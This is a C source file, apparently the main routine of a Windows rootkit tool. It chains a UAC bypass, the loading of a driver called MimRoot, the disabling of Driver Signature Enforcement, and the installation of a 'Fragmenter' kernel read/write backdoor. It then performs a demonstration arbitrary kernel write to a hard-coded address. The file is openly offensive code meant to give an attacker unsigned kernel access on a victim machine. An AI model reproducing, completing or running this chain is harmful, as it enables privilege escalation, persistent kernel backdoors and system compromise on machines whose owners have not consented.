#include <Windows.h>
#include <stdio.h>

#include "Defs.h"
#include "Exploit.h"
#include "Load.h"
#include "UAC.h"

int main(int argc, char** argv)
{
	char pFilePath[MAX_PATH] = { 0 };

	memset(pFilePath, 0, sizeof(pFilePath));

	if (!IsElevated())
	{
		if (!GetCurrentDirectoryA(sizeof(pFilePath), pFilePath))
		{
			return 1;
		}
		strcat_s(pFilePath, sizeof(pFilePath), "\\");

		return BypassUAC(pFilePath);
	}
	printf("[+] Bypassed UAC\n");

	if (argc < 2)
	{
		return 1;
	}
	if (MoveDriver(MIMKRNL_NAME, argv[1], DRIVER_PATH))
	{
		return 1;
	}
	if (MoveDriver(FRAGMENTER_NAME, argv[1], DRIVER_PATH))
	{
		return 1;
	}

	if (LoadDriver(MIMKRNL_NAME, MIMKRNL_DISPLAY_NAME, 1))
	{
		return 1;
	}
	printf("[+] Loaded MimRoot\n[*] Disabling DSE...\n");

	if (DisableDSE())
	{
		return 1;
	}
	printf("[+] Disabled DSE\n");

	if (LoadDriver(FRAGMENTER_NAME, FRAGMENTER_DISPLAY_NAME, 0))
	{
		return 1;
	}
	printf("[+] Installed Fragmenter R/W backdoor\n");

	// Temp code for demonstration purposes
	printf("Press \"ENTER\" to trigger the arbitrary write...");
	getchar();
	char pWriteData[2048];
	memset(pWriteData, 'A', sizeof(pWriteData));
	BackdoorReadWrite((void*)0xfffff80309a00000, (void*)pWriteData, sizeof(pWriteData));
	printf("done.");
	getchar();
	// Temp code for demonstration purposes

	// TODO: Patch out the mimkrnl.sys driver so it does not crash the system upon unloading.
	// I can't believe this is a real thing I have to do.

	return 0;
}